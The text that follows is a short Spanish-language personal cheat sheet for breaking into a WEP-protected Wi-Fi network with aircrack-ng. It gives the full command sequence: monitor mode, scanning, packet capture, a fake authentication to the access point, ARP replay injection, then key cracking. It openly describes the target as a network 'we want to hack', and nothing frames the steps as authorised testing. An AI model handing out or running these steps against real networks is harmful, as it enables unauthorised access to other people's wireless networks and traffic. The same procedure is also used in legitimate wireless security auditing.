http://www.aircrack-ng.org/doku.php?id=airmon-ng

sudo -s

Chequear si algún proceso está controlando la wifi:
airmon-ng check wlo1

Matar esos procesos


Poner la interfaz wifi en modo escaneo:
airmon-ng start wlo1

  A lo mejor hace falta sacarla del NetworkManager:
  /etc/NetworkManager/NetworkManager.conf
  [keyfile]
  unmanaged-devices=mac:b2:d4:3c:ef:5b:71

  systemctl restart NetworkManager

  Si no funciona, parar el NetworkManager.

Tras el start debemos ver que nos ha creado una nueva interfaz en modo monitor:
iwconfig
  Veremos la interfaz wlo1mon con "Mode:Monitor"

A veces tengo que hacerlo una segunda vez:
airmon-ng start wlo1mon
  y nos creara ya bien la interfaz en modo monitorizacion en wlo1monmon

Escaneo de redes:
airodump-ng -a wlo1mon


Ver redes WEP:
airodump-ng wlo1mon --encrypt wep

Si queremos guardar el tráfico:
airodump-ng -w /tmp/TMPlinset/dump -a wlo1mon


Colocar la interfaz en un canal determinado:
airodump-ng wlo1mon --channel 11


Testear si podemos atacar a una red:
aireplay-ng -9 -a C0:DF:DE:D4:D7:1D wlo1mon


Capturar paquetes:
airodump-ng -c 11 --bssid C0:DF:DE:D4:D7:1D -w captura wlo1mon

En otra terminal hacemos un fake auth para registrar nuestra MAC y que el AP no nos rechaze las inyecciones del siguiente paso:
aireplay-ng -1 0 -e NOMBRE_RED -a MAC_AP -h NUESTRA_MAC wlo1mon

Escuchar peticiones ARP y reinyectarlas. Aquí necesitamos que haya tráfico en la wifi que queremos hacekar:
aireplay-ng -3 -b MAC_AP -h NUESTRA_MAC wlo1mon


Una vez el inyector esté funcionando, podemos poner el aircrack a intentar conseguir la clave:
aircrack-ng captura-01.cap


Detener modo monitor:
airmon-ng stop wlan0mon
